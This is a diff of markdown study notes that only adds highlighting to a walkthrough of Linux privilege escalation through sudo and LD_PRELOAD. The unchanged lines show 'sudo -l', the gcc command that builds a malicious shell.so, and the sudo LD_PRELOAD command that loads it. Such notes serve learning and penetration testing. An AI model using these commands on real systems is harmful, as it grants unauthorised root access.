@@ -3,7 +3,7 @@
 The idea is to create a custom shared library that contains a malicious code (*for example `system()`*) and the he can use `LD_PRELOAD` to charge this library when a program with `sudo` privilege is executed.
 
 
-We start from:
+<mark style="background: #FFF3A3A6;">We start from:</mark>
 ```bash
 sudo -l
 ```
@@ -36,7 +36,7 @@ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 
 
 
-At this point we can run any command or executable on which we have the `sudo` permission in this way:
+<mark style="background: #BBFABBA6;">At this point we can run any command or executable on which we have the `sudo` permission in this way:</mark>
 ```bash
 sudo LD_PRELOAD=/FULL_PATH/shell.so COMMAND_OR_EXEC
 ```
